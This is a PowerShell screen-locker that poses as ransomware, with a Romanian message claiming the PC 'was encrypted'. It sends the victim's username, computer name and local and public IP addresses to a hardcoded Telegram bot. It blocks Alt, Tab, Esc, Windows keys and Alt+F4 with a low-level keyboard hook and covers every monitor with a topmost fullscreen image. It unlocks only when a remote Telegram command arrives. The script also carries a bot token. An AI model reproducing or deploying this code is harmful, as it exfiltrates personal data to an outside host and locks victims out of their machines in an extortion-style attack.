# SETTINGS
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"
$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatID = "656189986"
$pc = $env:COMPUTERNAME
$user = $env:USERNAME
$unlockCommand = "/unlock$user"

# DOWNLOAD IMAGE
Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing

# SEND TELEGRAM MESSAGE FUNCTION
function Send-Telegram-Message {
    try {
        $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
            $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80'
        })[0].IPAddress
    } catch { $ipLocal = "n/a" }

    try { $ipPublic = (Invoke-RestMethod "https://api.ipify.org") } catch { $ipPublic = "n/a" }

    $message = "PC-ul $user ($pc) a fost criptat cu succes.nIP: $ipLocal | $ipPublicnnUnlock it: $unlockCommand"
    $body = @{ chat_id = $chatID; text = $message } | ConvertTo-Json -Compress
    Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
}

Send-Telegram-Message

# IMPROVED LOW-LEVEL KEYBOARD HOOK CLASS (Blocks ALT+F4, ALT, Win, Tab, Esc)
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class KeyBlocker {
    private static IntPtr hookId = IntPtr.Zero;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc proc = HookCallback;

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;
    private const int WM_KEYUP = 0x0101;
    private const int WM_SYSKEYUP = 0x0105;
    private static bool altPressed = false;

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    public static void Block() { hookId = SetHook(proc); }
    public static void Unblock() { UnhookWindowsHookEx(hookId); }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
            int vkCode = Marshal.ReadInt32(lParam);

            if (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN) {
                if (vkCode == 0x43) Environment.Exit(0); // C key closes app

                if (vkCode == 0x12) altPressed = true; // ALT pressed

                // Explicitly block Alt+F4
                if (altPressed && vkCode == 0x73)
                    return (IntPtr)1;

                // Block Windows keys, ALT, Tab, Esc individually
                if (vkCode == 0x09 || vkCode == 0x1B || vkCode == 0x5B || vkCode == 0x5C || vkCode == 0x12)
                    return (IntPtr)1;
            }

            if (wParam == (IntPtr)WM_KEYUP || wParam == (IntPtr)WM_SYSKEYUP) {
                if (vkCode == 0x12) altPressed = false; // ALT released
            }
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
}
"@

[KeyBlocker]::Block()

# FULLSCREEN ON ALL MONITORS
Add-Type -AssemblyName System.Windows.Forms,System.Drawing

$forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
    $form = New-Object Windows.Forms.Form -Property @{
        FormBorderStyle = 'None'
        WindowState = 'Maximized'
        StartPosition = 'Manual'
        TopMost = $true
        Location = $screen.Bounds.Location
        Size = $screen.Bounds.Size
        Cursor = [System.Windows.Forms.Cursors]::None
        BackColor = 'Black'
    }

    $pb = New-Object Windows.Forms.PictureBox -Property @{
        Image = [System.Drawing.Image]::FromFile($tempImagePath)
        Dock = 'Fill'
        SizeMode = 'StretchImage'
    }

    $form.Add_Deactivate({ $form.Activate() })
    $form.Controls.Add($pb)
    $form.Show()
    $form
}

# TELEGRAM LISTENER WITH TIMER (Stable offset)
$offset = 0
try {
    $initialUpdates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates" -UseBasicParsing -TimeoutSec 5
    if ($initialUpdates.result.Count -gt 0) {
        $offset = ($initialUpdates.result | Select-Object -Last 1).update_id + 1
    }
} catch { }

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 5000 # check every 5 seconds
$timer.Add_Tick({
    try {
        $url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
        $response = Invoke-RestMethod $url -UseBasicParsing -TimeoutSec 5
        foreach ($update in $response.result) {
            $offset = $update.update_id + 1
            if ($update.message.text -eq $unlockCommand) {
                [System.Windows.Forms.Application]::Exit()
            }
        }
    } catch { }
})
$timer.Start()

# START APP LOOP
[System.Windows.Forms.Application]::Run()

# CLEANUP ON EXIT
$timer.Stop()
[KeyBlocker]::Unblock()
